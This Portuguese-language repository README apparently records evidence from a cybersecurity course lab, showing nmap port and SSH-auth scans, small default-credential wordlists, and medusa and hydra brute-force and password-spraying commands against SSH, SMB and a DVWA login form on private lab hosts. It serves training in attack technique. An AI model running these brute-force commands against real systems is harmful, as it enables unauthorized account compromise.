# SIMULANDO ATAQUES DE BRUTE FORCE
### Repositorio criado para compartilhar as evidencias do curso Santander - Cibersegurança 2025

1.	**Varredura de portas e versão do serviço**

`nmap -sV 192.168.200.20` <br/>

![Saída da varreadura realizada para identificação das portas abertas e as versões dos serviços em txt](/saidas_testes/varredura_portas_nmap.txt) <br/>

![Saída da varreadura realizada para identificação das portas abertas e as versões dos serviços](/img/varredura_portas_abertas.png) <br/>


2.	**Varredura na porta 22 com o script “ssh-auth-methods” para identificar os tipos de autenticação que o host permite**

`nmap -v -p22 --script=ssh-auth-methods -Pn 192.168.200.20` <br/>

![Saída da varreadura realizada para identificação dos tipos de autenticação permitido em txt](/saidas_testes/varredura_ssh-auth-mehtods.txt) <br/>

![Saída da varreadura realizada para identificação dos tipos de autenticação permitido](/img/varredura_ssh-auth-mehtods.png) <br/>

3.	**Criar listas de usuários e senhas**

- `echo -e "user\nmsfadmin\nroot\nservice\nadmin\nsysadmin" > users.txt` <br/>
- `echo -e "123456\npassword\nqwerty\nmsfadmin\nadmin\npass123\npasswd" > pass.txt` <br/>

4.	**Brute force ssh com wordlist**

`medusa -h 192.168.200.20 -U users.txt -P pass.txt -M ssh -t 6` <br/>

![Saída do teste brute force com medusa e wordlist em txt](/saidas_testes/brute_force_medusa.txt) <br/>

![Saída do teste brute force com medusa e wordlist](/img/test_user_pass_medusa.png) <br/>

![Teste de credenciais utilizando o putty](/img/test_ssh_port.png) <br/>

5.	Brute force em formulário PHP com HYDRA

`hydra -L users.txt -P pass.txt 192.168.47.129 http-post-form "/dvwa/login.php:user=^USER^&password=^PASS^&Login=Login:Fail=Login failed" -V`

![Saída do teste brute force em formulario PHP com hydra em txt](/saidas_testes/brute_force_form_hydra.txt) <br/>

![Saída do teste brute force em formulario PHP com hydra](/img/brute_force_form_hydra.png) <br/>

![Teste de credenciais utilizando o putty](/img/test_brute_force_form_hydra.png) <br/>

6.	Ataque em cadeia, enumeração, smb + password spraying

Enumeração - `enum4linux -a 192.168.47.130| tee enum4_output.txt` <br/>

![Saída da enumeração com o enu4linux em txt](/saidas_testes/enumeracao_enum4linux.txt) <br/>

![Saída da enumeração com o enu4linux](/img/enumeracao_enum4linux.png) <br/>

Wordlist para os testes <br/>
- user - `echo -e "user\nmsfadmin\nroot\nservice" > smb_users.txt`
- senhas - `echo -e "password\n123456\nmsfadmin\nWelcome123" > senhas_spray.txt`  <br/>

Brute force com medusa no protocolo SMB <br/>

![Saída do teste brute force em cadeia com medusa e wordlist em txt](/saidas_testes/brute_force_smb.txt) <br/>

![Saída do teste brute force em cadeia com medusa e wordlist](/img/brute_force_smb_medusa.png) <br/>

Teste de credenciais utilizando o smbclient <br/>

![Teste de credenciais utilizando o smbclient](/img/test_sbm_port.png) <br/>

